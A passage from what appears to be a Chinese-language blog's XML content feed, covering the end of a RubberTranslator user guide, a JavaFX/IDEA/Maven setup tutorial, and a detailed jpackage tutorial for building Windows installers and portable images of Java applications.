data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/Gu9OkaJ3Q8.gif"></p><p>再看添加词组后：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/MD3Q6XYcnu.gif"></p><p><strong>支持java正则表达式。</strong></p><h3 id="3-历史记录数量设置"><a href="#3-历史记录数量设置" class="headerlink" title="3. 历史记录数量设置"></a>3. 历史记录数量设置</h3><p>可以设置历史记录的数量，历史记录并不会持久化到硬盘上，每次启动程序都会清空，所有历史记录都会保留在内存中，所以不建议将历史记录数量设置过大。</p><h3 id="4-自定义样式"><a href="#4-自定义样式" class="headerlink" title="4. 自定义样式"></a>4. 自定义样式</h3><p>RubberTranslator支持自定义css样式。 如，设置护眼模式，更改字体大小的css：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span> &#123;</span><br><span class="line">    <span class="attribute">-fx-font-size</span>: <span class="number">10pt</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#focus</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-area</span> &#123;</span><br><span class="line"><span class="attribute">-fx-font-size</span>: <span class="number">10pt</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.text-area</span> <span class="selector-class">.content</span>&#123;</span><br><span class="line">    <span class="attribute">-fx-background-color</span>: <span class="built_in">rgb</span>(<span class="number">199</span>,<span class="number">237</span>,<span class="number">204</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515212539191.png"></p><p>更多可设置效果，请参考</p><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YWZ4LzIvYXBpL2phdmFmeC9zY2VuZS9kb2MtZmlsZXMvY3NzcmVmLmh0bWw=" title="https://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html">https://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html<i class="fa fa-external-link"></i></span></p><h3 id="5-OCR-百度和有道APi设置"><a href="#5-OCR-百度和有道APi设置" class="headerlink" title="5. OCR 百度和有道APi设置"></a>5. OCR 百度和有道APi设置</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h2 id="3-常见问题"><a href="#3-常见问题" class="headerlink" title="3. 常见问题"></a>3. 常见问题</h2><h3 id="1-安装后无法打开？"><a href="#1-安装后无法打开？" class="headerlink" title="1. 安装后无法打开？"></a>1. 安装后无法打开？</h3><p>请确保安装路径无中文，如果安装在C盘，请给予管理员权限。</p><h3 id="2-翻译时段落识别问题，一段话被拆分为多段？"><a href="#2-翻译时段落识别问题，一段话被拆分为多段？" class="headerlink" title="2. 翻译时段落识别问题，一段话被拆分为多段？"></a>2. 翻译时段落识别问题，一段话被拆分为多段？</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200516104744264.png" alt="image-20200516104744264"></p><p>这和RubberTranslator在格式化复制的文本时的处理机制有关，RubberTranslator在识别多段文本的原理是，判断当前是否有 英文或中文的句号在末尾， 如果在末尾则换行。所以可以看到，原文在parameter后面有句号，RubberTranslator进行了断行。</p><h3 id="3-谷歌翻译引擎下没有分段？"><a href="#3-谷歌翻译引擎下没有分段？" class="headerlink" title="3. 谷歌翻译引擎下没有分段？"></a>3. 谷歌翻译引擎下没有分段？</h3><p>是的，当前所使用的谷歌翻译引擎，会将所有文本连接成一行，所以，暂时没办法分段，后期会考虑更换接口。</p><h3 id="4-OCR、百度、有道翻译引擎无效？"><a href="#4-OCR、百度、有道翻译引擎无效？" class="headerlink" title="4. OCR、百度、有道翻译引擎无效？"></a>4. OCR、百度、有道翻译引擎无效？</h3><p>这三个功能需要用户自行配置App key &amp; secret key。请参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h2 id="开源许可"><a href="#开源许可" class="headerlink" title="开源许可"></a>开源许可</h2><p>GPL v3.0</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaFX+IDEA+Maven环境搭建</title>
      <link href="/archives/dba39b2f.html"/>
      <url>/archives/dba39b2f.html</url>
      
        <content type="html"><![CDATA[<p>本文讲解如何在Idea上搭建JavaFX开发环境，对应视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXR6NDExcTdRMS8=" title="https://www.bilibili.com/video/BV1tz411q7Q1/">https://www.bilibili.com/video/BV1tz411q7Q1/<i class="fa fa-external-link"></i></span></p><p>如果想了解如何打包JavaFX程序，参见：<a href="https://www.ravenxrz.ink/archives/421e5ad2.html">https://www.ravenxrz.ink/archives/421e5ad2.html</a></p><a id="more"></a><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>要搭建环境，最直接的肯定是参看官方文档了，<span class="exturl" data-url="aHR0cHM6Ly9vcGVuamZ4LmlvL29wZW5qZngtZG9jcy8=" title="https://openjfx.io/openjfx-docs/">https://openjfx.io/openjfx-docs/<i class="fa fa-external-link"></i></span></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506111205459.png" alt="image-20200506111205459"></p><p>这里再复述一遍：</p><h3 id="step1-添加archetype（只用第一次添加，后面创建项目就不用了）"><a href="#step1-添加archetype（只用第一次添加，后面创建项目就不用了）" class="headerlink" title="step1: 添加archetype（只用第一次添加，后面创建项目就不用了）"></a>step1: 添加archetype（只用第一次添加，后面创建项目就不用了）</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506111939997.png" alt="image-20200506111939997"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112020694.png" alt="image-20200506112020694"></p><ul><li><p>the groupId (org.openjfx),</p></li><li><p>the artifactId (javafx-maven-archetypes)</p></li><li><p>the version (0.0.1)</p></li></ul><h3 id="step2-创建项目"><a href="#step2-创建项目" class="headerlink" title="step2 创建项目"></a>step2 创建项目</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112115982.png" alt="image-20200506112115982"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112145436.png" alt="image-20200506112145436"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112203726.png" alt="image-20200506112203726"></p><p>value中填写：</p><ul><li>javafx-archetype-fxml， javafx项目包含fxml</li><li>javafx-archetype-simple， javafx项目不包含fxml</li></ul><p>二者选一，我以javafx-archetype-simple为例</p><p>然后点击右上角的+：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112319277.png" alt="image-20200506112319277"></p><p>指定javafx的版本，目前最新为14。</p><p>Finish即可。第一次创建可能有点慢，因为maven需要下载一些依赖包。</p><p>打开pom文件，修改javafx插件版本为0.03：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.openjfx&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javafx-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.3&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;mainClass&gt;org.example.App&lt;/mainClass&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>看一下创建好的目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112428268.png" alt="image-20200506112428268"></p><p>打开App，运行。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112458825.png" alt="image-20200506112458825"></p>]]></content>
      
      
      <categories>
          
          <category> JavaFX </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java应用程序打包-jpackage使用记录</title>
      <link href="/archives/421e5ad2.html"/>
      <url>/archives/421e5ad2.html</url>
      
        <content type="html"><![CDATA[<p>jpackage是java 14里面自带的打包工具，jpackage解决了java开发过程中得一个难题：分发自己的程序，需要客户电脑中已安装jre环境。有了jpackage，我们可以直接将java程序打包成安装包，具体来说：</p><ul><li>Windows：exe，msi</li><li>Mac：dmg，pkg</li><li>Linux：deb，rpm</li></ul><p>jpackage目前并不成熟，但是也算是可以使用。另外，虽然jpackage可以打包各个系统的安装包，但是在一个系统上只能打对应系统的安装包。比如在windows上，就只能打成exe或msi。</p><a id="more"></a><p>额外建议：jpackage打包，涉及到java 9中的模块概念以及如何使用jlink自定义jre的知识，请自行学习。推荐阅读：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTI1MjU5OTU0ODM0Mzc0NC8xMjgxNzk1OTI2NTIzOTM4" title="https://www.liaoxuefeng.com/wiki/1252599548343744/1281795926523938">模块-廖雪峰<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTdjNjQzYTZmYjlhMDYzM2IyMGZlYmU=" title="https://juejin.im/post/5a7c643a6fb9a0633b20febe">Java9新特性系列（模块化系统: Jigsaw-&gt;Modularity）<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTgyNDMyNg==" title="https://zhuanlan.zhihu.com/p/45824326">我的Java（定制你的Java/JavaFX Runtime）<i class="fa fa-external-link"></i></span></li></ul><p>本文主要介绍如何使用jpackage打包，以及在打包过程中遇到的各种坑。</p><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><p>要使用jpackage打包，请确保：</p><ol><li>安装好jdk 14，配置好JAVA_HOME和PATH</li><li>windows平台，请安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpeHRvb2xzZXQvd2l4Mw==" title="https://github.com/wixtoolset/wix3">wix3<i class="fa fa-external-link"></i></span></li></ol><p>安装好，打开cmd，执行jpackage -h：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506083414289.png" alt="image-20200506083414289"></p><p>如果有这样的显示，那说明安装成功。注意首行的WARNING，这个不用管，因为jpackage目前还属于一个孵化阶段，所有有这样的提示。</p><p>另外，下文中的所有程序都可放在了github，地址：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLW1pc2MvanBhY2thZ2UtZGVtbw==" title="https://github.com/raven-misc/jpackage-demo">https://github.com/raven-misc/jpackage-demo<i class="fa fa-external-link"></i></span></p><h2 id="2-非模块程序打包"><a href="#2-非模块程序打包" class="headerlink" title="2. 非模块程序打包"></a>2. 非模块程序打包</h2><p>先以<strong>非模块程序</strong>为例，新建一个java项目，得到如下目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506085408605.png" alt="image-20200506085408605"></p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.raven;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Raven</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2020/5/6 8:53</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Toolkit.getDefaultToolkit().beep();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>功能很简单，让系统发出beep声。</p><p>然后将这个项目打包成jar包，可以通过命令，也可以直接通过idea，自行选择，我这里采用idea：</p><p><img data-src="https://pic.downk.cc/item/5eb22654c2a9a83be5ae6281.png" alt="image-20200506085602846"></p><p>测试一下通过java -jar能否运行：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506090006946.png" alt="image-20200506090006946"></p><p>好的，现在我们将这个jar包打成安装包：</p><p>在根目录下建立一个lib，并把Non-modular-packging-demo.jar复制进lib目录下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506090210470.png" alt="image-20200506090210470"></p><h3 id="2-1-安装包"><a href="#2-1-安装包" class="headerlink" title="2.1 安装包"></a>2.1 安装包</h3><p>在根目录下，打开你的terminal，执行（命令是执行不成功的，会报311错误，但是先执行看看）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-m</span><br><span class="line">odular-packaging-demo.jar</span><br></pre></td></tr></table></figure><ul><li>–name 打包后的安装包名</li><li>–input  要打包的文件目录</li><li>–main-class 这是非必须选项，如果你的jar包META-INF/MANIFEST.MF中已经指定了Main-Class, 则无需此命令。</li><li>–main-jar 主程序所在jar包</li><li>其余常用：<ul><li>–temp 临时文件所在目录，默认系统temp</li><li>–dest 打包到哪个目录下,默认当前目录</li><li>–type 打包成什么类型，exe？msi？deb等等，windows默认是exe</li></ul></li></ul><p>不过在我使用这条命令时(2020/5/5)，<strong>报了311错误</strong>，源头来自wix。解决方案，在命令后指定vendor，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-m</span><br><span class="line">odular-packaging-demo.jar --vendor raven</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091042775.png" alt="image-20200506091042775"></p><p>ok，已经打包成功，试试安装吧（提示，又会有想不到的效果）。</p><p>相信你通过双击安装，已经发现了问题，那就是安装后没有任何效果，没有windows-menu，没有windows快捷键，程序也没有运行启动。但是<strong>控制面板已经找到安装程序了</strong>。我一度以为是自己电脑环境的问题，最后发现在windows平台上还需加上几条命令才行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-modular-packaging-demo.jar --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Non-modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>–win-dir-chooser, 安装时添加“选择安装路路径”</li><li>–win-shortcut,安装后自动在桌面添加快捷键</li><li>–win-menu-group,启动该应用程序所在的菜单组(实测无效，但是必须有这条命令，没有–win-menu会报311错误)</li><li>–win-menu，添加到系统菜单中</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091723697.png" alt="image-20200506091723697"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091759019.png" alt="image-20200506091759019"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091808728.png" alt="image-20200506091808728"></p><p>现在双击启动程序试试，应该就有beep了。再看看安装目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506092615980.png" alt="image-20200506092615980"></p><h3 id="2-2-便携版（无需安装）"><a href="#2-2-便携版（无需安装）" class="headerlink" title="2.2 便携版（无需安装）"></a>2.2 便携版（无需安装）</h3><p>jpackage提供一个选项，可以用来生成镜像（image），而这个镜像就可以充当便携版执行命令和上面基本一致，添加–type app-image命令,删除所有–win-xxx即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --type app-image --input lib --main-class com.raven.App --main-jar Non-modular-packaging-demo.jar --vendor raven</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506092833058.png" alt="image-20200506092833058"></p><p>内部目录和安装包安装后的目录完全一致，所以直接压缩这个文件夹就有便携版了。</p><h3 id="2-3-便携版–-gt-安装包"><a href="#2-3-便携版–-gt-安装包" class="headerlink" title="2.3 便携版–&gt;安装包"></a>2.3 便携版–&gt;安装包</h3><p>我们打包成镜像后，还可以将镜像转化为安装包（通常发生在我们想对镜像做一些定制化内容时），执行命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --type msi --app-image Non-modular-installer --vendor raven</span><br></pre></td></tr></table></figure><p>这里打包成msi:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506093330774.png" alt="image-20200506093330774"></p><h2 id="3-模块程序打包"><a href="#3-模块程序打包" class="headerlink" title="3. 模块程序打包"></a>3. 模块程序打包</h2><p>通过maven新建JavaFX项目，得到如下目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506085023406.png" alt="image-20200506085023406"></p><p>运行一下，看下效果：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506093953328.png" alt="image-20200506093953328"></p><p>模块化程序打包就略微复杂一些了，首先明确一点，idea中，有maven在，所有的编译输出不在out目录下，而在target目录下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506094133814.png" alt="image-20200506094133814"></p><p>除此之外，还需要明确我们当前的模块名：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506094239319.png" alt="image-20200506094239319"></p><p>当前模块名为app。</p><h3 id="2-1-字节码打包"><a href="#2-1-字节码打包" class="headerlink" title="2.1 字节码打包"></a>2.1 字节码打包</h3><p>首先确定依赖的modules，在module-info.java文件中，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095324701.png" alt="image-20200506095324701"></p><p>生成如下的依赖图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095350078.png" alt="image-20200506095350078"></p><p>不用关注java开头和jdk开头的模块，因为它们是系统自带的。也就是所当前app模块直接或间接依赖了：</p><ul><li>javafx.controls</li><li>javafx.graphics</li><li>javafx.base</li></ul><p>三个模块，现在我们要找到这个三个模块jar包路径，如何找？</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095511115.png" alt="image-20200506095511115"></p><p>在这上面右键–&gt;Show in Exploer即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095601116.png" alt="image-20200506095601116"></p><p>可以看到导航到了我们的maven仓库中，分别记下这三个jar包的路径，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14 win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar</span><br></pre></td></tr></table></figure><p><strong>现在都是自己手动找的，之后会介绍插件，自动寻找。</strong></p><p>ok，准备工作就绪，开始打包。在target目录下，打开terminal：</p><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path classes;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>–name 应用程序名</li><li>–module-path: 也就是前面让你找的几个依赖模块的jar包路径（以;间隔）+classes（自己的模块）</li><li>-m: 指定主模块及主程序。 app/com.raven.App, “/“前是模块名，”/“后是主程序全路径。</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100019571.png" alt="image-20200506100019571"></p><p>现在还会遇到的问题，在”非模块程序打包“下都已经作了说明，现在补全所有命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path classes;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><h3 id="2-2-通过jar包打包"><a href="#2-2-通过jar包打包" class="headerlink" title="2.2 通过jar包打包"></a>2.2 通过jar包打包</h3><p>注意到我们上面module-path中有一项是classes，这就是我们自己的模块，我们也可以先将整个模块打包成jar包，然后替换classes。</p><p>有maven，打包就是再简单不过的事了，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100337247.png" alt="image-20200506100337247"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100405088.png" alt="image-20200506100405088"></p><p>重新执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path Modular-packaging-demo-1.0-SNAPSHOT.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><h3 id="2-3-打包成镜像（便携版）"><a href="#2-3-打包成镜像（便携版）" class="headerlink" title="2.3 打包成镜像（便携版）"></a>2.3 打包成镜像（便携版）</h3><p>同”非模块程序打包“一样，添加–type,删除–win-xx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path Modular-packaging-demo-1.0-SNAPSHOT.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --type app-image</span><br></pre></td></tr></table></figure><h3 id="2-4-定制jre，自定义jlink，插件化（推荐打包方式）"><a href="#2-4-定制jre，自定义jlink，插件化（推荐打包方式）" class="headerlink" title="2.4 定制jre，自定义jlink，插件化（推荐打包方式）"></a>2.4 定制jre，自定义jlink，插件化（推荐打包方式）</h3><p>在jpackage打包模块化程序时，其实底层调用了jlink，比如我们的–module-path参数，其实时会传递给jlink的。当我们需要对jlink做一些自定义参数时，可以先调用jlink生成自定义的jre，然后通过这个jre来打包。</p><p>前面的打包过程，有一个非常头疼的问题，那就是需要我们自己去寻找依赖，然后找到这些一些的路径。（当然其实下载jmods也是可以的，但是还是麻烦的），还好我们有插件辅助。</p><p>打开pom文件，会看到这个插件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.openjfx&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javafx-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.3&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;mainClass&gt;com.raven.App&lt;/mainClass&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>注意版本一定要是0.0.3+。然后点击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102259548.png" alt="image-20200506102259548"></p><p>会得到：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102410359.png" alt="image-20200506102410359"></p><p>在image/bin中打开terminal，执行<code>java --list-modules</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app</span><br><span class="line">java.base@14.0.1</span><br><span class="line">java.datatransfer@14.0.1</span><br><span class="line">java.desktop@14.0.1</span><br><span class="line">java.prefs@14.0.1</span><br><span class="line">java.xml@14.0.1</span><br><span class="line">javafx.base</span><br><span class="line">javafx.controls</span><br><span class="line">javafx.graphics</span><br><span class="line">jdk.unsupported@14.0.1</span><br></pre></td></tr></table></figure><p>上面就是我们这个jre所包含的所有模块。可以和我们之前做依赖分析的图做对比，是不是完全相同？<br>接着我们通过jre来进行打包。</p><p>回到target目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage -n Modular-packaging-demo --type msi --runtime-image image --vendor raven</span><br></pre></td></tr></table></figure><p>老规矩，如果需要menu，shortcut，自己添加。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102742159.png" alt="image-20200506102742159"></p><p>细心的同学会发现一个问题，那就是我们手动打包的exe文件对比通过jre打包的文件，体积会小很多。这怎么办呢？</p><p>回想一下，为什么我们要通过插件来打包，<strong>因为我们不想手动找各个模块的依赖路径</strong>。换句话说，只要我能够方便的获取模块的依赖路径就好了。</p><p>好，那怎么办呢？</p><p>其实通过maven+debug就好了。再次在target目录下打开terminal：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean -X javafx:jlink</span><br></pre></td></tr></table></figure><p>-X打开debug。最后会得到：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506103403094.png" alt="image-20200506103403094"></p><p>这就是我们的依赖路径了，提取出来，再手动执行jpackage就ok了。</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 